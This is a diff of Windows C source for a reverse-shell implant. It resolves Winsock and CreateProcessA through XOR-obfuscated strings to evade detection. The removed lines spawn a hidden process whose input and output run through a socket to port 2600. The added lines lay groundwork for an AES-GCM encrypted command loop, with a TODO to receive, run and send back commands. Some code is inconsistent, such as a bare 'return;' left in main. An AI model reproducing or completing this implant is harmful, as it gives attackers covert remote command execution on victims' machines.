@@ -28,16 +28,24 @@ int main(){
     ULONG result = 0;
     NTSTATUS status;
     BYTE pbSecret[32]; // Replace with your AES key bytes (16, 24, or 32 bytes)
+    BYTE tag[16];
     
     ULONG cbSecret = sizeof(pbSecret);
     BYTE nonce[12]; 
+
+
     
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_INIT(&authInfo);
 
+    authInfo.cbNonce = sizeof(nonce);
+    authInfo.pbNonce = nonce;
+    authInfo.pbTag = tag;
+    authInfo.cbTag = sizeof(tag);
+
     status = BCryptOpenAlgorithmProvider(&aesAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status)) {
-        return;
+        return 0;
     }
 
 
@@ -95,106 +103,69 @@ int main(){
         return;
     }
 
-    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO cipherInfo;
-    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_INIT(&cipherInfo);
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
     
-
-    
-    BCRYPT_ALG_HANDLE rsaAlgorithm = NULL;
-
-
-    
-    BCryptOpenAlgorithmProvider(&rsaAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
-
-
-    //Get a handle in a DLL Windows that is already mapped
-    HMODULE hKernel32 = GetModuleHandleA(s_kernel);
-    //Locate the memory adress of the function "CreateProcessA"
-    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(hKernel32, s_createproc);
-    //look for a DLL on disk drive and load it
     HMODULE hWs2_32 = LoadLibraryA(s_ws2_32);
+    if (hWs2_32 == NULL) {
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return 0;
+    }
 
-
-    char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; //WSAStartup
-    char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00};//WSASocketA
-    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};//connect
+    char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
+    char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
+    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00}; // connect
     decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
     decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
     decode(s_connect, 'K', sizeof(s_connect) - 1);
 
-    // Locate network functions
     pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, s_WSAStartup);
     pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hWs2_32, s_WSASocketA);
     pConnect myConnect = (pConnect)GetProcAddress(hWs2_32, s_connect);
+    if (!myWSAStartup || !myWSASocket || !myConnect) {
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return 0;
+    }
 
+    if (myWSAStartup(MAKEWORD(2,2), &wsa) != 0) {
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return 0;
+    }
 
-    //execution
-    myWSAStartup(MAKEWORD(2,2), &wsa);
     SOCKET soc = myWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (soc == INVALID_SOCKET) {
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return 0;
+    }
 
-    //clean the struct sinfo & pinfo
-    memset(&sinfo, 0, sizeof(sinfo));
-    memset(&pinfo, 0, sizeof(pinfo));
-
-    // Assign the count of binary of the struct size
-    sinfo.cb = sizeof(sinfo);
-
-
-
-    sinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
-    sinfo.wShowWindow = SW_HIDE;
-    sinfo.hStdInput = (HANDLE)soc;
-    sinfo.hStdOutput = (HANDLE)soc;
-    sinfo.hStdError = (HANDLE)soc;
-
-    // set server's variables
     server.sin_family = AF_INET;
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("127.0.0.1");
 
-    myConnect(soc, (struct sockaddr *)&server, sizeof(server));
-
-    if (myCreateProcess != NULL) {
-        myCreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-        WaitForSingleObject(pinfo.hProcess, INFINITE);
+    if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0) {
+        closesocket(soc);
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return 0;
     }
-    
+
+    // TODO: add encrypted packet receive/decrypt, run command, encrypt/send loop using recv_all and send_all
+    recv_all(soc, &rcvbuffer, 4);
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-    
 // cleanup
     closesocket(soc);
     WSACleanup();
@@ -218,7 +189,26 @@ char* decode(char* message, char key, int lenght){
     return message;
 }
 
-void AES_encode(){
-
+int recv_all(SOCKET sock,char *buff,int len){
+    int received = 0;
+    int total = 0;
+    while(total < len){
+        received = recv(sock, buff + total, len - total, 0);
+        if (received <= 0) return received;
+        total += received;
+    }
+    return total;
 }
+
+int send_all(SOCKET sock,char *buff,int len){
+    int sent = 0;
+    int total = 0;
+    while(total < len){
+        sent = send(sock, buff + total, len - total, 0);
+        if (sent <= 0) return sent;
+        total += sent;
+    }
+    return total;
+}
+
 
